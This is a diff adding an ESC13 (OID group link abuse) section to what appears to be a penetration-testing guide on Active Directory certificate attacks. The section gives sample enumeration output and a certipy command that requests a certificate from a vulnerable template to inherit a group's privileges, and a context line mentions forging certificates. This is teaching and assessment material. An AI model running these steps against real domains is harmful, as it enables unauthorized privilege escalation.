@@ -695,6 +695,47 @@ $ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common 
 
 Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.
 
+
+## OID Group Link Abuse - ESC13
+
+### Explanation
+
+The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+
+In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group. 
+
+You can use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
+
+```powershell
+Enumerating OIDs
+------------------------
+OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+------------------------
+Enumerating certificate templates
+------------------------
+Certificate template ManagerAuthentication may be used to obtain membership of CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+
+Certificate template Name: ManagerAuthentication
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=Vulnerable template,CN=Users,DC=domain,DC=htb
+------------------------
+```
+
+### Abuse Scenario
+
+All you need to do just specify the template, you will get a certificate with OIDToGroupLink rights.
+
+```bash
+certipy req -u "mane@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'Vulnerable template'
+```
+
 ## Compromising Forests with Certificates Explained in Passive Voice
 
 ### Breaking of Forest Trusts by Compromised CAs
